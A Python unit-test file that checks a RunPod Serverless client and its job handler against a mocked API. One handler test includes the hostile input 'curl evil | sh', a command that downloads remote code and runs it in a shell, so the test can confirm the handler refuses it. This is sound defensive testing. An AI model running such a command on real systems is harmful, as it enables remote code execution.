"""RunPod Serverless dial-out client and handler (#859); no network or GPU."""

import importlib.util
import json
from pathlib import Path
import tempfile
import unittest

import httpx

from studio_platform.dstack_capacity import DstackError
from studio_platform.runpod_serverless import (
    BACKEND,
    RoutedClient,
    RunPodServerlessClient,
)
from studio_platform.worker_boot import boot_commands, boot_env

INTENT = "0f0e0d0c-0b0a-4908-8706-050403020100"
RUN = "sixnine-" + INTENT.replace("-", "")
TOKEN = "t" * 43
URL = "https://staging.inkseq.com/v1/worker/boot"


def spec(**changes):
    configuration = {
        "type": "task",
        "name": RUN,
        "image": "example/native@sha256:" + "a" * 64,
        "commands": boot_commands(TOKEN),
        "backends": [BACKEND],
        "resources": {"gpu": {"name": ["RTX5090"], "count": 1}},
        "max_price": 1.2,
        "max_duration": "off",
        "env": boot_env(INTENT, TOKEN, URL),
    }
    configuration.update(changes)
    return {
        "run_name": RUN,
        "configuration": configuration,
        "ssh_key_pub": "ssh-ed25519 AAAA",
    }


class FakeRunPod:
    def __init__(self):
        self.jobs, self.calls = {}, []

    def __call__(self, request):
        path = request.url.path
        self.calls.append((request.method, path))
        assert request.headers["authorization"] == "Bearer " + "k" * 32
        if path.endswith("/run"):
            body = json.loads(request.content)
            self.jobs["job-1"] = {"status": "IN_QUEUE", "input": body["input"]}
            self.policy = body["policy"]
            return httpx.Response(200, json={"id": "job-1", "status": "IN_QUEUE"})
        if "/status/" in path:
            job = self.jobs[path.rsplit("/", 1)[1]]
            return httpx.Response(200, json={"id": "job-1", **job})
        if "/cancel/" in path:
            self.jobs[path.rsplit("/", 1)[1]]["status"] = "CANCELLED"
            return httpx.Response(200, json={"status": "CANCELLED"})
        if path.endswith("/health"):
            live = sum(
                j["status"] in {"IN_QUEUE", "IN_PROGRESS"} for j in self.jobs.values()
            )
            return httpx.Response(
                200, json={"jobs": {"inQueue": 0, "inProgress": live}}
            )
        return httpx.Response(404)


class RunPodServerlessTests(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory()
        self.fake = FakeRunPod()
        self.config = {
            "api_key": "k" * 32,
            "endpoint_id": "abc123",
            "gpu_name": "RTX5090",
            "gpu_memory_gib": 32,
            "cpus": 8,
            "memory_gib": 46,
            "disk_gib": 200,
            "hourly_microusd": 1_100_000,
            "state_dir": str(Path(self.temp.name) / "jobs"),
        }
        self.client = RunPodServerlessClient(
            self.config,
            "inkseq-staging",
            http=httpx.Client(transport=httpx.MockTransport(self.fake)),
        )

    def tearDown(self):
        self.temp.cleanup()

    def test_plan_offers_the_endpoint_only_for_its_gpu_and_price(self):
        offers = self.client.plan(spec())["job_plans"][0]["offers"]
        self.assertEqual([o["backend"] for o in offers], [BACKEND])
        self.assertEqual(
            offers[0]["instance"]["resources"]["gpus"][0]["name"], "RTX5090"
        )
        for changed in (
            {"max_price": 0.5},
            {"resources": {"gpu": {"name": ["H100"]}}},
            {"backends": ["vastai"]},
        ):
            self.assertEqual(
                self.client.plan(spec(**changed))["job_plans"][0]["offers"], []
            )

    def test_apply_sends_only_the_boot_command_and_env(self):
        run = self.client.apply(spec())
        job = self.fake.jobs["job-1"]["input"]
        self.assertEqual(
            job,
            {
                "command": spec()["configuration"]["commands"][0],
                "env": boot_env(INTENT, TOKEN, URL),
            },
        )
        self.assertEqual(self.fake.policy["executionTimeout"], 7200 * 1000)
        self.assertEqual(run["run_spec"], spec())
        self.assertEqual(
            (run["status"], run["project_name"]), ("provisioning", "inkseq-staging")
        )
        with self.assertRaisesRegex(DstackError, "existing_run"):
            self.client.apply(spec())
        for bad in ({"env": {}}, {"commands": ["exec sleep infinity"]}):
            with self.assertRaisesRegex(DstackError, "dialout_required"):
                self.client.apply(dict(spec(**bad), run_name="sixnine-" + "b" * 32))

    def test_status_maps_to_dstack_run_and_provisioning_data(self):
        applied = self.client.apply(spec())
        self.fake.jobs["job-1"].update(
            status="IN_PROGRESS", workerId="w123", executionTime=36_000
        )
        run = self.client.get(run_name=RUN)
        self.assertEqual(run["id"], applied["id"])
        self.assertEqual(self.client.get(run_id=applied["id"])["id"], applied["id"])
        self.assertEqual(run["status"], "running")
        jpd = run["latest_job_submission"]["job_provisioning_data"]
        self.assertEqual((jpd["backend"], jpd["instance_id"]), (BACKEND, "w123"))
        self.assertEqual(len(jpd["instance_type"]["resources"]["gpus"]), 1)
        self.assertAlmostEqual(run["cost"], 0.011)
        self.assertIsNone(self.client.get(run_name="sixnine-" + "c" * 32))
        self.client.stop(RUN)
        self.assertEqual(self.client.get(run_name=RUN)["status"], "terminated")
        # RunPod expires job status; the journaled terminal state stays.
        del self.fake.jobs["job-1"]
        calls = len(self.fake.calls)
        self.assertEqual(self.client.get(run_name=RUN)["status"], "terminated")
        self.assertEqual(self.client.provider_inventory(BACKEND)["instance_ids"], [])
        self.assertEqual(self.fake.calls[calls:], [("GET", "/v2/abc123/health")])

    def test_unbound_job_is_unknown_not_absent(self):
        self.client._write(
            RUN,
            {"run_name": RUN, "run_id": "x", "job_id": None, "spec": spec()},
            create=True,
        )
        with self.assertRaisesRegex(DstackError, "requires_reconciliation"):
            self.client.get(run_name=RUN)

    def test_inventory_lists_live_jobs_and_must_match_health(self):
        self.client.apply(spec())
        self.fake.jobs["job-1"].update(status="IN_PROGRESS", workerId="w123")
        inventory = self.client.provider_inventory(BACKEND)
        self.assertEqual(
            (inventory["complete"], inventory["instance_ids"]), (True, ["w123"])
        )
        self.fake.jobs["ghost"] = {
            "status": "IN_PROGRESS"
        }  # A job this journal never made.
        with self.assertRaisesRegex(DstackError, "inventory_unconfirmed"):
            self.client.provider_inventory(BACKEND)

    def test_routed_client_sends_only_its_backend_to_serverless(self):
        class Dstack:
            def plan(self, spec):
                return "dstack-plan"

            def get(self, **kwargs):
                return "dstack-run"

            def stop(self, run_name):
                return "dstack-stop"

            def configured_backends(self):
                return frozenset({"vastai"})

            project = "p"

        routed = RoutedClient(Dstack(), self.client)
        self.assertEqual(routed.plan(spec(backends=["vastai"])), "dstack-plan")
        self.assertEqual(
            routed.plan(spec())["job_plans"][0]["offers"][0]["backend"], BACKEND
        )
        self.assertEqual(routed.configured_backends(), {"vastai", BACKEND})
        self.assertEqual(routed.get(run_name="sixnine-" + "d" * 32), "dstack-run")
        self.assertEqual(routed.stop("sixnine-" + "d" * 32), "dstack-stop")
        routed.apply(spec())
        self.assertEqual(routed.get(run_name=RUN)["status"], "provisioning")
        self.assertEqual(routed.project, "p")


class HandlerTests(unittest.TestCase):
    def setUp(self):
        path = (
            Path(__file__).resolve().parents[1] / "deploy/runpod-serverless/handler.py"
        )
        loaded = importlib.util.spec_from_file_location("rp_handler", path)
        self.module = importlib.util.module_from_spec(loaded)
        loaded.loader.exec_module(self.module)

    def test_runs_only_the_boot_script_with_its_env(self):
        seen = []

        def run(argv, **kwargs):
            seen.append((argv, kwargs["env"]))
            return type("Done", (), {"returncode": 0})()

        good = {"command": boot_commands(TOKEN)[0], "env": boot_env(INTENT, TOKEN, URL)}
        self.assertEqual(
            self.module.handler({"input": good}, run=run), {"exit_code": 0}
        )
        self.assertEqual(seen[0][0], ["bash", "-c", good["command"]])
        self.assertEqual(seen[0][1]["INKSEQ_INTENT"], INTENT)
        for bad in (
            {"command": "curl evil | sh", "env": good["env"]},
            {"command": good["command"], "env": {**good["env"], "EXTRA": "1"}},
            None,
        ):
            self.assertEqual(
                self.module.handler({"input": bad}, run=run),
                {"error": "inkseq_boot_input_refused"},
            )
        self.assertEqual(len(seen), 1)


if __name__ == "__main__":
    unittest.main()
